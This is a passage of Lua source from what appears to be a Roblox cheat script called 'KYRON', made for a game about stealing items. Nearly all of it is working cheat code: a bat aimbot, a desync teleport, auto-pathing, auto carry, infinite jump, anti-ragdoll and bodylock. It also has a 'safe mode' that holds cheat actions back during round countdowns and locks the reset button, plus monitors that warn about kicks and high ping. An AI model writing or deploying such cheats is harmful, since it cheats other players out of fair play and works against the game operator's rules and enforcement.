            KYRONSafeModeState.timerStartUsed = true
            KYRONSafeModeState.timerLastNumber = timerLastNumber
            KYRONSafeModeState.timerSawInactive = false
            return true
          end

          if KYRONSafeModeState then
            KYRONSafeModeState.timerLastNumber = timerLastNumber
          end

          return false
        end

        _G._KYRONSafeModeHoldingBrainrot = function()
          for _, v95 in ipairs({
            "Stealing",
            "Carrying",
            "IsCarrying",
            "HoldingBrainrot",
            "HasBrainrot",
          }) do
            local ok, result = pcall(function()
              return localPlayer:GetAttribute(v95)
            end)

            if ok and result == true then
              return true
            end
          end

          local character = localPlayer.Character
          if not character then
            return false
          end

          for _, v95 in ipairs({
            "Stealing",
            "Carrying",
            "IsCarrying",
            "HoldingBrainrot",
            "HasBrainrot",
          }) do
            local ok, result = pcall(function()
              return character:GetAttribute(v95)
            end)

            if ok and result == true then
              return true
            end
            local v96 = character:FindFirstChild(v95, true)
            if v96 and v96:IsA("BoolValue") and v96.Value then
              return true
            end
          end

          return false
        end

        _G._KYRONSafeModeActionActive = function(arg)
          if arg == "aimbot" then
            return combatSettings.aimbot == true
          end

          if arg == "tpBat" then
            return combatSettings.desync == true
          end

          if arg == "autoLeft" then
            return autoPathState.L == true
          end

          if arg == "autoRight" then
            return autoPathState.R == true
          end
          return false
        end

        _G._KYRONSafeModeActionLabel = function(arg)
          return ({
            aimbot = "AIMBOT",
            tpBat = "TP BAT",
            autoLeft = "AUTO LEFT",
            autoRight = "AUTO RIGHT",
          })[arg] or "ACTION"
        end

        _G._KYRONSafeModeBlockReason = function()
          if _G._KYRONSafeModeEnabled ~= true then
            return nil
          end
          local KYRONSafeModeState = _G._KYRONSafeModeState
          if KYRONSafeModeState and KYRONSafeModeState.countdown then
            return "ROUND COUNTDOWN"
          end

          if KYRONSafeModeState and KYRONSafeModeState.holding then
            return "BRAINROT HELD"
          end
          return nil
        end

        -- Safe Mode state, action queue, and safeguards.
        _G._KYRONSafeModeApplyBackend = function(arg, arg2)
          local aimbot = arg2 == true

          if arg == "aimbot" then
            if aimbot and combatSettings.desync then
              combatSettings.desync = false
              combatSettings.desyncSwing = false
              pcall(fn49)

              if handlers["TP Bat"] then
                handlers["TP Bat"](false, true)
              end
            end

            combatSettings.aimbot = aimbot

            if aimbot then
              pcall(fn46)
            else
              pcall(fn47)
            end

            if handlers["Bat Aimbot"] then
              handlers["Bat Aimbot"](aimbot, true)
            end
          elseif arg == "tpBat" then
            if aimbot and combatSettings.aimbot then
              combatSettings.aimbot = false
              pcall(fn47)

              if handlers["Bat Aimbot"] then
                handlers["Bat Aimbot"](false, true)
              end
            end

            combatSettings.desync = aimbot
            combatSettings.desyncSwing = aimbot
            flag27 = false
            _G._KYRONTPMirrorEnabled = false
            table.clear(tbl36)

            if aimbot then
              pcall(fn48)
            else
              pcall(fn49)
            end

            if handlers["TP Bat"] then
              handlers["TP Bat"](aimbot, true)
            end
          elseif arg == "autoLeft" then
            if aimbot then
              if autoPathState.R then
                autoPathState.R = false
                pcall(autoPathState.stopR, true)
              end

              autoPathState.L = true
              pcall(autoPathState.startL)
            else
              autoPathState.L = false
              pcall(autoPathState.stopL)
            end

            if handlers["Auto Left"] then
              handlers["Auto Left"](aimbot, true)
            end

            if handlers["Auto Right"] then
              handlers["Auto Right"](autoPathState.R == true, true)
            end
          elseif arg == "autoRight" then
            if aimbot then
              if autoPathState.L then
                autoPathState.L = false
                pcall(autoPathState.stopL, true)
              end

              autoPathState.R = true
              pcall(autoPathState.startR)
            else
              autoPathState.R = false
              pcall(autoPathState.stopR)
            end

            if handlers["Auto Right"] then
              handlers["Auto Right"](aimbot, true)
            end

            if handlers["Auto Left"] then
              handlers["Auto Left"](autoPathState.L == true, true)
            end
          end

          if _G._KYRONSyncMobile then
            pcall(_G._KYRONSyncMobile)
          end
        end

        _G._KYRONSafeModeSetAction = function(arg, arg2)
          local KYRONSafeModeState = _G._KYRONSafeModeState
          if not KYRONSafeModeState or not KYRONSafeModeState.pending then
            return false
          end

          if not (arg2 == true) then
            local flag29 = KYRONSafeModeState.pending[arg] == true
            local flag30

            if flag29 then
              flag30 = os.clock() - (KYRONSafeModeState.queuedAt and KYRONSafeModeState.queuedAt[arg] or 0) < 0.25
            else
              flag30 = flag29
            end

            if flag30 then
              return true
            end
            KYRONSafeModeState.pending[arg] = false

            if KYRONSafeModeState.queuedAt then
              KYRONSafeModeState.queuedAt[arg] = 0
            end

            _G._KYRONSafeModeApplyBackend(arg, false)

            if flag29 then
              _G._KYRONSafeModeNotify(_G._KYRONSafeModeActionLabel(arg) .. " QUEUE CANCELED")
            end

            return true
          end

          local v95 = _G._KYRONSafeModeBlockReason(arg)

          if v95 then
            if arg == "aimbot" then
              KYRONSafeModeState.pending.tpBat = false
            end

            if arg == "tpBat" then
              KYRONSafeModeState.pending.aimbot = false
            end

            if arg == "autoRight" then
              KYRONSafeModeState.pending.autoRight = false
            end

            if arg == "autoRight" then
              KYRONSafeModeState.pending.autoLeft = false
            end

            KYRONSafeModeState.pending[arg] = true

            if KYRONSafeModeState.queuedAt then
              KYRONSafeModeState.queuedAt[arg] = os.clock()
            end

            _G._KYRONSafeModeApplyBackend(arg, false)
            _G._KYRONSafeModeNotify(_G._KYRONSafeModeActionLabel(arg) .. " QUEUED - " .. v95)
            return false
          end

          if arg == "aimbot" then
            KYRONSafeModeState.pending.tpBat = false
          end

          if arg == "tpBat" then
            KYRONSafeModeState.pending.aimbot = false
          end

          if arg == "autoLeft" then
            KYRONSafeModeState.pending.autoRight = false
          end

          if arg == "autoRight" then
            KYRONSafeModeState.pending.autoLeft = false
          end

          KYRONSafeModeState.pending[arg] = false

          if KYRONSafeModeState.queuedAt then
            KYRONSafeModeState.queuedAt[arg] = 0
          end

          _G._KYRONSafeModeApplyBackend(arg, true)
          return true
        end

        _G._KYRONSafeModeToggleAction = function(arg)
          local KYRONSafeModeState = _G._KYRONSafeModeState
          if KYRONSafeModeState and KYRONSafeModeState.pending and KYRONSafeModeState.pending[arg] then
            return _G._KYRONSafeModeSetAction(arg, false)
          end
          return _G._KYRONSafeModeSetAction(arg, not _G._KYRONSafeModeActionActive(arg))
        end

        _G._KYRONSafeModeEvaluate = function()
          local KYRONSafeModeState = _G._KYRONSafeModeState
          if not KYRONSafeModeState then
            return
          end
          local countdown = _G._KYRONSafeModeCountdownActive() == true
          local holding = _G._KYRONSafeModeHoldingBrainrot() == true
          local flag29 = countdown and not KYRONSafeModeState.countdown
          local flag30 = KYRONSafeModeState.countdown and not countdown
          local flag31 = holding and not KYRONSafeModeState.holding
          KYRONSafeModeState.countdown = countdown
          KYRONSafeModeState.holding = holding
          if _G._KYRONSafeModeSetResetLock then
            _G._KYRONSafeModeSetResetLock(_G._KYRONSafeModeEnabled == true and holding)
          end
          if _G._KYRONSafeModeEnabled ~= true then
            return
          end

          if flag29 then
            _G._KYRONSafeModeNotify("ROUND COUNTDOWN - ACTIONS LOCKED")

            for _, v95 in ipairs({ "aimbot", "tpBat", "autoLeft", "autoRight" }) do
              if _G._KYRONSafeModeActionActive(v95) then
                KYRONSafeModeState.pending[v95] = true
                _G._KYRONSafeModeApplyBackend(v95, false)
              end
            end
          end

          if flag31 then
            for _, v95 in ipairs({ "aimbot", "tpBat", "autoLeft", "autoRight" }) do
              if _G._KYRONSafeModeActionActive(v95) then
                KYRONSafeModeState.pending[v95] = true
                _G._KYRONSafeModeApplyBackend(v95, false)
              end
            end
          end

          if flag30 then
            _G._KYRONSafeModeNotify("ROUND COUNTDOWN ENDED")
          end

          for _, v95 in ipairs({ "autoLeft", "autoRight", "aimbot", "tpBat" }) do
            if KYRONSafeModeState.pending[v95] and not _G._KYRONSafeModeBlockReason(v95) then
              KYRONSafeModeState.pending[v95] = false
              _G._KYRONSafeModeApplyBackend(v95, true)
              _G._KYRONSafeModeNotify(_G._KYRONSafeModeActionLabel(v95) .. " ENABLED")
            end
          end

          if _G._KYRONSyncMobile then
            pcall(_G._KYRONSyncMobile)
          end
        end

        _G._KYRONSafeModeSetEnabled = function(arg, arg2)
          _G._KYRONSafeModeEnabled = arg == true
          if not _G._KYRONSafeModeEnabled and _G._KYRONSafeModeSetResetLock then
            _G._KYRONSafeModeSetResetLock(false)
          end
          local KYRONSafeModeState = _G._KYRONSafeModeState

          if not _G._KYRONSafeModeEnabled and KYRONSafeModeState and KYRONSafeModeState.pending then
            KYRONSafeModeState.pending.aimbot = false
            KYRONSafeModeState.pending.tpBat = false
            KYRONSafeModeState.pending.autoLeft = false
            KYRONSafeModeState.pending.autoRight = false
          end

          if arg2 then
            _G._KYRONSafeModeNotify(_G._KYRONSafeModeEnabled and "SAFE MODE ENABLED" or "SAFE MODE DISABLED")
          end

          if _G._KYRONSafeModeEnabled then
            if KYRONSafeModeState then
              KYRONSafeModeState.countdown = false
              KYRONSafeModeState.holding = false
            end

            pcall(_G._KYRONSafeModeEvaluate)
          end

          if _G._KYRONSyncMobile then
            pcall(_G._KYRONSyncMobile)
          end
        end

        _G._KYRONSafeModeSetResetLock = function(arg)
          local state = _G._KYRONSafeModeState
          local lock = arg == true
          if state and state.resetLocked == lock then
            return
          end
          pcall(function()
            game:GetService("StarterGui"):SetCore("ResetButtonCallback", lock and false or true)
          end)
          if state then
            state.resetLocked = lock
          end
          if lock and _G._KYRONSafeModeNotify then
            _G._KYRONSafeModeNotify("SAFE MODE: RESET LOCKED WHILE HOLDING")
          end
        end

        local function fn79()
          local KYRONSafeModeCarryConnections = {}

          local tbl50 = {
            Stealing = true,
            Carrying = true,
            IsCarrying = true,
            HoldingBrainrot = true,
            HasBrainrot = true,
          }

          local function fn80(arg)
            if KYRONSafeModeCarryConnections[arg] then
              pcall(function()
                KYRONSafeModeCarryConnections[arg]:Disconnect()
              end)

              KYRONSafeModeCarryConnections[arg] = nil
            end
          end

          local function fn81()
            if _G._KYRONSafeModeEnabled ~= true then
              return
            end

            task.defer(function()
              if _G._KYRONSafeModeEnabled == true then
                pcall(_G._KYRONSafeModeEvaluate)
              end
            end)
          end

          local function fn82(arg)
            local tbl51 = {}

            for k in pairs(KYRONSafeModeCarryConnections) do
              if k:sub(1, 10) == "char_" then
                table.insert(tbl51, k)
              end
            end

            for _, v95 in ipairs(tbl51) do
              fn80(v95)
            end

            if not arg then
              return
            end

            for k in pairs(tbl50) do
              KYRONSafeModeCarryConnections["char_attr_" .. k] = arg:GetAttributeChangedSignal(k):Connect(fn81)
              local v95 = arg:FindFirstChild(k, true)

              if v95 and v95:IsA("BoolValue") then
                fn80("char_value_" .. k)
                KYRONSafeModeCarryConnections["char_value_" .. k] = v95:GetPropertyChangedSignal("Value"):Connect(fn81)
              end
            end

            KYRONSafeModeCarryConnections.char_added = arg.DescendantAdded:Connect(function(descendant)
              if tbl50[descendant.Name] then
                if descendant:IsA("BoolValue") then
                  fn80("char_value_" .. descendant.Name)
                  KYRONSafeModeCarryConnections["char_value_" .. descendant.Name] = descendant:GetPropertyChangedSignal("Value"):Connect(fn81)
                end

                fn81()
              elseif descendant:IsA("Tool") then
                fn81()
              end
            end)

            KYRONSafeModeCarryConnections.char_removed = arg.DescendantRemoving:Connect(function(descendant)
              if tbl50[descendant.Name] or descendant:IsA("Tool") then
                fn81()
              end
            end)
          end

          for k in pairs(tbl50) do
            KYRONSafeModeCarryConnections["player_attr_" .. k] = localPlayer:GetAttributeChangedSignal(k):Connect(fn81)
          end

          KYRONSafeModeCarryConnections.character = localPlayer.CharacterAdded:Connect(function(character)
            fn82(character)
            fn81()
          end)

          _G._KYRONSafeModeCarryConnections = KYRONSafeModeCarryConnections
          fn82(localPlayer.Character)
        end

        fn79()

        _G._KYRONSafeModeMonitor = RunService.Heartbeat:Connect(function()
          local KYRONSafeModeState = _G._KYRONSafeModeState
          local flag29 = _G._KYRONSettingsReady ~= true or _G._KYRONSafeModeEnabled ~= true or not KYRONSafeModeState
          local flag30

          if flag29 then
            flag30 = flag29
          else
            flag30 = os.clock() - (KYRONSafeModeState.lastCheck or 0) < 0.1
          end

          if flag30 then
            return
          end
          KYRONSafeModeState.lastCheck = os.clock()
          pcall(_G._KYRONSafeModeEvaluate)
        end)

        local function fn80()
          if _G._KYRONKickWarning and type(_G._KYRONKickWarning.Destroy) == "function" then
            pcall(_G._KYRONKickWarning.Destroy)
          end

          local n40 = 2.3
          local flag29 = false
          local flag30 = false
          local flag31 = false
          local connection2 = nil
          local connection3 = nil
          local KYRONKickWarning = playerGui:FindFirstChild("KYRONKickWarning")

          if KYRONKickWarning then
            KYRONKickWarning:Destroy()
          end

          local screenGui2 = Instance.new("ScreenGui")
          screenGui2.Name = "KYRONKickWarning"
          screenGui2.ResetOnSpawn = false
          screenGui2.IgnoreGuiInset = true
          screenGui2.DisplayOrder = 999
          screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
          screenGui2.Parent = playerGui
          local frame6 = Instance.new("Frame", screenGui2)
          frame6.Name = "KickTimerBanner"
          frame6.AnchorPoint = Vector2.new(0.5, 0)
          frame6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
          frame6.BorderSizePixel = 0
          frame6.Visible = false
          frame6.ClipsDescendants = true
          frame6.ZIndex = 100
          Instance.new("UICorner", frame6).CornerRadius = UDim.new(1, 0)
          local frame7 = Instance.new("Frame", frame6)
          frame7.Name = "ReadyFill"
          frame7.Position = UDim2.new(0, 0, 0, 0)
          frame7.Size = UDim2.new(1, 0, 1, 0)
          frame7.BackgroundColor3 = Color3.fromRGB(255, 255, 240)
          frame7.BackgroundTransparency = 1
          frame7.BorderSizePixel = 0
          frame7.ZIndex = 101
          Instance.new("UICorner", frame7).CornerRadius = UDim.new(1, 0)
          local frame8 = Instance.new("Frame", frame6)
          frame8.Name = "ProgressBorderPath"
          frame8.BackgroundTransparency = 1
          frame8.Size = UDim2.fromScale(1, 1)
          frame8.ClipsDescendants = true
          frame8.ZIndex = 102
          Instance.new("UICorner", frame8).CornerRadius = UDim.new(1, 0)
          local tbl50 = {}
          local n41 = 0
          local textLabel2 = Instance.new("TextLabel", frame6)
          textLabel2.Size = UDim2.new(1, -16, 1, 0)
          textLabel2.Position = UDim2.new(0, 8, 0, 0)
          textLabel2.BackgroundTransparency = 1
          textLabel2.Text = "DONT ENTER"
          textLabel2.TextColor3 = Color3.fromRGB(255, 240, 240)
          textLabel2.Font = Enum.Font.GothamBlack
          textLabel2.TextSize = KYRONSafeModeEnabled and 12 or 14
          textLabel2.TextXAlignment = Enum.TextXAlignment.Center
          textLabel2.TextYAlignment = Enum.TextYAlignment.Center
          textLabel2.ZIndex = 103
          local n42 = 320
          local n43 = 70
          local n44 = 14

          local function fn81()
            for _, v95 in ipairs(tbl50) do
              if v95 and v95.Parent then
                v95:Destroy()
              end
            end

            tbl50 = {}
            n41 = 0
          end

          local function fn82()
            fn81()
            local n45 = KYRONSafeModeEnabled and 2 or 2
            local n46 = n45 + 1
            local n47 = math.max(3, (n43 - n46 * 2) * 0.5)
            local n48 = n43 * 0.5
            local n49 = n46 + n47
            local n50 = n42 - n46 - n47
            local n51 = math.max(1, n50 - n49)
            local n52 = 3.1415926535897931 * n47
            local n53 = n51 * 2 + n52 * 2
            local n54 = math.clamp(math.ceil(n53 / 4), 72, 180)
            local n55 = n53 / n54 + 1.25

            for i = 1, n54 do
              local n56 = (i - 0.5) / n54 * n53
              local n57, n58, n59

              if n56 <= n51 then
                n57 = n49 + n56
                n58 = 0
                n59 = n46
              elseif n56 <= n51 + n52 then
                local n60 = -1.5707963267948966 + (n56 - n51) / n47
                n57 = n50 + math.cos(n60) * n47
                n59 = n48 + math.sin(n60) * n47
                n58 = n60 + 1.5707963267948966
              elseif n56 <= n51 * 2 + n52 then
                n57 = n50 - n56 - n51 - n52
                n59 = n43 - n46
                n58 = 3.1415926535897931
              else
                local n60 = 1.5707963267948966 + (n56 - n51 * 2 - n52) / n47
                n57 = n49 + math.cos(n60) * n47
                n59 = n48 + math.sin(n60) * n47
                n58 = n60 + 1.5707963267948966
              end

              local frame9 = Instance.new("Frame", frame8)
              frame9.Name = "ProgressSegment"
              frame9.AnchorPoint = Vector2.new(0.5, 0.5)
              frame9.Position = UDim2.fromOffset(n57, n59)
              frame9.Size = UDim2.fromOffset(n55, n45)
              frame9.Rotation = math.deg(n58)
              frame9.BackgroundColor3 = Color3.fromRGB(255, 255, 240)
              frame9.BackgroundTransparency = 1
              frame9.BorderSizePixel = 0
              frame9.ZIndex = 102
              Instance.new("UICorner", frame9).CornerRadius = UDim.new(1, 0)
              tbl50[i] = frame9
            end
          end

          local function fn83()
            frame7.BackgroundTransparency = 1
            n41 = 0

            for _, v95 in ipairs(tbl50) do
              v95.BackgroundTransparency = 1
            end
          end

          local function fn84(arg)
            local n45 = #tbl50
            local n46 = #tbl50
            local n47 = math.clamp(math.floor(math.clamp(arg, 0, 1) * n45 + 0.5), 0, n46)

            if n47 < n41 then
              for i = n47 + 1, n41 do
                local v95 = tbl50[i]

                if v95 then
                  v95.BackgroundTransparency = 1
                end
              end
            elseif n41 < n47 then
              for i = n41 + 1, n47 do
                local v95 = tbl50[i]

                if v95 then
                  v95.BackgroundTransparency = 0
                end
              end
            end

            n41 = n47
          end

          local function fn85()
            local currentCamera = workspace.CurrentCamera
            currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

            if KYRONSafeModeEnabled then
              n42 = math.clamp(math.floor(currentCamera.X * 0.56), 190, 270)
              n43 = 34
              n44 = 42
            else
              n42 = math.clamp(math.floor(currentCamera.X * 0.25), 280, 340)
              n43 = 70
              n44 = 14
            end

            frame6.Size = UDim2.fromOffset(n42, n43)
            textLabel2.TextSize = KYRONSafeModeEnabled and 16 or 14
            fn82()

            if not frame6.Visible then
              fn83()
              frame6.Position = UDim2.new(0.5, 0, 0, -n43 - 10)
            end
          end

          fn85()
          local currentCamera = workspace.CurrentCamera

          if currentCamera then
            connection3 = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn85)
          end

          local function fn86()
            if connection2 then
              connection2:Disconnect()
              connection2 = nil
            end

            if frame6.Parent then
              frame6.Visible = false
              fn83()
              frame6.Position = UDim2.new(0.5, 0, 0, -n43 - 10)
            end

            flag30 = false
          end

          local function fn87()
            if type(_G._KYRONSafeModeHoldingBrainrot) == "function" then
              local ok, result = pcall(_G._KYRONSafeModeHoldingBrainrot)
              if ok and result then
                return true
              end
            end

            if localPlayer:GetAttribute("Stealing") == true then
              return true
            end
            local character = localPlayer.Character
            if not character then
              return false
            end

            for _, child in ipairs(character:GetChildren()) do
              local str10 = child.Name:lower()
              if str10:find("brainrot") or str10:find("brain") or str10:find("animal") or str10:find("carry") or str10:find("stolen") or str10:find("held") or str10:find("steal") then
                return true
              end
            end

            for k, v95 in pairs(character:GetAttributes()) do
              local str10 = k:lower()
              if v95 == true and (str10:find("carrying") or str10:find("carry") or str10:find("stealing") or str10:find("isstealing") or str10:find("hasbrainrot")) then
                return true
              end
            end

            local v95 = character:FindFirstChildOfClass("Humanoid")
            return v95 ~= nil and v95.WalkSpeed > 0 and v95.WalkSpeed <= 25 and v95.WalkSpeed ~= 16
          end

          local function fn88()
            return _G._KYRONKickWarningEnabled ~= false
          end

          local function fn89()
            if flag29 or not fn88() or flag30 then
              return
            end
            flag30 = true
            fn85()
            fn83()
            textLabel2.Text = "DONT ENTER"
            textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
            frame6.Visible = true
            frame6.Position = UDim2.new(0.5, 0, 0, -n43 - 12)
            TweenService:Create(frame6, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Position = UDim2.new(0.5, 0, 0, n44) }):Play()
            local now2 = tick()
            local flag32 = false

            if connection2 then
              connection2:Disconnect()
            end

            connection2 = RunService.RenderStepped:Connect(function()
              local v95 = flag29
              local flag33

              if flag29 then
                flag33 = v95
              else
                flag33 = not fn88()
              end

              if flag33 then
                fn86()
                return
              end

              if flag32 or not frame6.Parent then
                if connection2 then
                  connection2:Disconnect()
                  connection2 = nil
                end

                return
              end

              local v96 = 0
              local v97 = 1
              local n45 = math.clamp((tick() - now2) / n40, v96, v97)
              fn84(n45)

              if n45 >= 1 then
                flag32 = true

                if connection2 then
                  connection2:Disconnect()
                  connection2 = nil
                end

                frame7.BackgroundTransparency = 0

                for _, v98 in ipairs(tbl50) do
                  v98.BackgroundTransparency = 1
                end

                textLabel2.Text = "ENTER"
                textLabel2.TextColor3 = Color3.fromRGB(0, 0, 0)

                task.delay(2.5, function()
                  if flag29 then
                    return
                  end

                  if not fn88() then
                    fn86()
                    return
                  end
                  TweenService:Create(frame6, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Position = UDim2.new(0.5, 0, 0, -n43 - 10) }):Play()

                  task.delay(0.45, function()
                    if flag29 then
                      return
                    end
                    frame6.Visible = false
                    flag30 = false
                  end)
                end)
              end
            end)
          end

          local function fn90(arg)
            _G._KYRONKickWarningEnabled = arg == true

            if not _G._KYRONKickWarningEnabled then
              fn86()
              flag31 = false
            end

            return _G._KYRONKickWarningEnabled
          end

          local fn91 = nil

          fn91 = function()
            flag29 = true
            fn86()

            if connection3 then
              connection3:Disconnect()
              connection3 = nil
            end

            if screenGui2.Parent then
              screenGui2:Destroy()
            end

            if _G._KYRONKickWarning and _G._KYRONKickWarning.Destroy == fn91 then
              _G._KYRONKickWarning = nil
            end
          end

          _G._KYRONKickWarning = {
            SetDuration = function(arg)
              local num = tonumber(arg)

              if num and num > 0 then
                n40 = num
              end
            end,
            GetDuration = function()
              return n40
            end,
            SetEnabled = fn90,
            IsEnabled = fn88,
            Show = fn89,
            Hide = fn86,
            Destroy = fn91,
          }

          fn90(_G._KYRONKickWarningEnabled ~= false)

          task.spawn(function()
            while not flag29 and screenGui2.Parent do
              if fn88() then
                local v95 = fn87()

                if not flag31 and v95 then
                  fn89()
                end

                flag31 = v95
              else
                if flag30 then
                  fn86()
                end

                flag31 = false
              end

              task.wait(0.1)
            end
          end)
        end

        fn80()

        _G._KYRONSafeModeNetworkMonitor = task.spawn(function()
          local GuiService = game:GetService("GuiService")
          local CoreGui = game:GetService("CoreGui")
          local lastBand, lastSignal = "normal", ""
          local function notify(message)
            if _G._KYRONSafeModeEnabled == true and _G._KYRONSafeModeNotify then
              _G._KYRONSafeModeNotify(message)
            end
          end
          local function signal(message)
            message = tostring(message or "")
            local lower = message:lower()
            if message ~= "" and message ~= lastSignal and (lower:find("kick") or lower:find("disconnect") or lower:find("removed from") or lower:find("error code")) then
              lastSignal = message
              notify("KICK/DISCONNECT WARNING: " .. message:sub(1, 100))
            end
          end
          pcall(function()
            GuiService.ErrorMessageChanged:Connect(signal)
          end)
          while playerGui.Parent do
            local ping
            pcall(function()
              ping = tonumber(tostring(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()):match("([%d%.]+)"))
            end)
            if _G._KYRONSafeModeEnabled == true and ping then
              local band = ping >= 500 and "critical" or ping >= 250 and "high" or ping >= 180 and "warning" or "normal"
              if band ~= lastBand then
                lastBand = band
                if band == "critical" then
                  notify("VERY HIGH PING: " .. math.floor(ping) .. "ms")
                elseif band == "high" then
                  notify("HIGH PING: " .. math.floor(ping) .. "ms")
                elseif band == "warning" then
                  notify("PING WARNING: " .. math.floor(ping) .. "ms")
                elseif band == "normal" then
                  notify("PING BACK TO NORMAL: " .. math.floor(ping) .. "ms")
                end
              end
            elseif _G._KYRONSafeModeEnabled ~= true then
              lastBand = "normal"
            end
            pcall(function()
              local prompt = CoreGui:FindFirstChild("RobloxPromptGui")
              local overlay = prompt and prompt:FindFirstChild("promptOverlay")
              local errorPrompt = overlay and overlay:FindFirstChild("ErrorPrompt")
              local label = errorPrompt and errorPrompt:FindFirstChildWhichIsA("TextLabel", true)
              if label and label.Visible then
                signal(label.Text)
              end
            end)
            task.wait(0.5)
          end
        end)

        fn78(Utility, "KYRON Skin", function(arg)
          if _G._KYRONSkin then
            _G._KYRONSkin.SetEnabled(arg)
          end
        end)

        if _G._KYRONSkin and handlers["KYRON Skin"] then
          handlers["KYRON Skin"](_G._KYRONSkin.IsEnabled(), true)
        end

        local function fn81(arg, arg2, arg3, arg4, arg5)
          if not arg then
            return
          end
          local v95 = nil

          for _, child in ipairs(arg:GetChildren()) do
            if child.Name == arg2 then
              v95 = child
              break
            else
              v95 = nil
            end
          end

          if not v95 then
            return
          end
          local children = arg:GetChildren()
          local v96 = nil

          for i, child in ipairs(children) do
            if child == v95 then
              v96 = i
              break
            else
              v96 = nil
            end
          end

          if not v96 then
            return
          end
          local v97 = nil

          for i = v96 + 1, math.min(v96 + 10, #children) do
            v97 = children[i]

            if v97:IsA("Frame") then
              local v98 = 0

              for _, child in ipairs(v97:GetChildren()) do
                if child:IsA("TextButton") then
                  v98 += 1
                end
              end

              if v98 ~= 2 then
                v97 = nil
                continue
              end
            else
              v97 = nil
              continue
            end

            break
          end

          if not v97 then
            return
          end
          local tbl50 = {}
          local v98 = nil

          for _, child in ipairs(v97:GetChildren()) do
            if child:IsA("TextButton") then
              tbl50[#tbl50 + 1] = child
            elseif child:IsA("Frame") and child.ZIndex == 4 then
              v98 = child
            end
          end

          if #tbl50 < 2 then
            return
          end
          local v99 = tbl50[1]
          local v100 = tbl50[2]
          local flag29 = arg5 and true or false

          local function fn82(arg6, arg7)
            flag29 = arg6

            if v98 then
              TweenService:Create(v98, TweenInfo.new(0.14), {
                Position = arg6 and UDim2.new(0.5, 0, 0, 4) or UDim2.new(0, 4, 0, 4),
              }):Play()
            end

            if not arg7 then
              if arg6 then
                pcall(arg4)
              else
                pcall(arg3)
              end

              if autoSaveSettings.auto then
                task.spawn(function()
                  pcall(saveKYRONSettings)
                end)
              end
            end
          end

          _G._KYRONSelectorAPI = _G._KYRONSelectorAPI or {}

          _G._KYRONSelectorAPI[arg2] = {
            set = fn82,
            get = function()
              return flag29
            end,
          }

          v99.Activated:Connect(function()
            fn82(false)
          end)

          v100.Activated:Connect(function()
            fn82(true)
          end)

          fn82(flag29, true)
        end

        if Movement then
          local function KYRONRefreshMovementModes()
            if v88 then
              v88.Text = movementSpeedSettings.family == "normal" and movementSpeedSettings.carry and "CARRY" or "NORMAL"
            end

            if v90 then
              v90.Text = movementSpeedSettings.family == "lagger" and movementSpeedSettings.carry and "LAGGER CARRY" or "LAGGER NORMAL"
            end
          end

          local function KYRONSetLaggerCarryMode(arg)
            movementSpeedSettings.family = "lagger"
            movementSpeedSettings.carry = arg and true or false

            if v90 then
              v90.Text = movementSpeedSettings.carry and "LAGGER CARRY" or "LAGGER NORMAL"
            end
          end

          -- Movement-mode synchronization and mobile dispatch.
          _G._KYRONRefreshMovementModes = KYRONRefreshMovementModes
          _G._KYRONSetLaggerCarryMode = KYRONSetLaggerCarryMode

          v89.Activated:Connect(function()
            if movementSpeedSettings.family == "normal" then
              movementSpeedSettings.carry = not movementSpeedSettings.carry
            else
              local carry = movementSpeedSettings.carry == true
              movementSpeedSettings.family = "normal"
              movementSpeedSettings.carry = carry
            end

            KYRONRefreshMovementModes()

            if _G._KYRONSyncMobile then
              _G._KYRONSyncMobile()
            end

            task.spawn(function()
              pcall(saveKYRONSettings)
            end)
          end)

          v91.Activated:Connect(function()
            if movementSpeedSettings.family == "lagger" then
              KYRONSetLaggerCarryMode(not movementSpeedSettings.carry)
            else
              KYRONSetLaggerCarryMode(movementSpeedSettings.carry == true)
            end

            if _G._KYRONAutoCarrySelectFamily then
              _G._KYRONAutoCarrySelectFamily(movementSpeedSettings.family, movementSpeedSettings.carry)
            end

            KYRONRefreshMovementModes()

            if _G._KYRONSyncMobile then
              _G._KYRONSyncMobile()
            end

            task.spawn(function()
              pcall(saveKYRONSettings)
            end)
          end)

          _G._KYRONSetCarry = function(arg)
            movementSpeedSettings.family = "normal"
            movementSpeedSettings.carry = arg and true or false
            KYRONRefreshMovementModes()

            if _G._KYRONSyncMobile then
              _G._KYRONSyncMobile()
            end
          end

          fn78(Movement, "TP Down", function(arg)
            if not arg then
              return
            end

            task.spawn(function()
              pcall(fn54)
              task.wait(0.18)

              if handlers["TP Down"] then
                handlers["TP Down"](false, true)
              end
            end)
          end)

          fn78(Movement, "Auto TP Down", function(arg)
            autoTeleportState.enabled = arg and true or false

            if arg then
              _G._KYRONStartAutoTP()
            else
              _G._KYRONStopAutoTP()
            end

            pcall(saveKYRONSettings)
          end)

          fn78(Speed, "Auto Carry Mode", function(arg)
            _G._KYRONAutoCarry = arg and true or false

            if _G._KYRONAutoCarry then
              pcall(_G._KYRONStartAutoCarry)
            else
              pcall(_G._KYRONStopAutoCarry)
            end

            pcall(saveKYRONSettings)
          end)

          fn81(Speed, "Auto Carry Mode", function()
            _G._KYRONAutoCarryMode = "ON STEAL"

            if _G._KYRONAutoCarry then
              pcall(_G._KYRONStopAutoCarry)
              pcall(_G._KYRONStartAutoCarry)
            end
          end, function()
            _G._KYRONAutoCarryMode = "WHEN NEAR"

            if _G._KYRONAutoCarry then
              pcall(_G._KYRONStopAutoCarry)
              pcall(_G._KYRONStartAutoCarry)
            end
          end, _G._KYRONAutoCarryMode == "WHEN NEAR")

          fn78(Movement, "Infinite Jump", function(arg)
            setInfiniteJumpEnabled(arg)
            print("[Toggle] Infinite Jump =", arg, "infJumpEnabled=", flag14)
            pcall(saveKYRONSettings)
          end)

          fn78(Movement, "Anti Ragdoll", function(enabled)
            ragdollRecoveryState.enabled = enabled

            if enabled then
              startRagdollRecovery()
            else
              stopRagdollRecovery()
            end

            print("[Toggle] Anti Ragdoll =", enabled, "AntiRag.enabled=", ragdollRecoveryState.enabled)
            pcall(saveKYRONSettings)
          end)

          fn78(Movement, "Bodylock", function(arg)
            if _G._KYRONLookAtEnemy and _G._KYRONLookAtEnemy.SetEnabled then
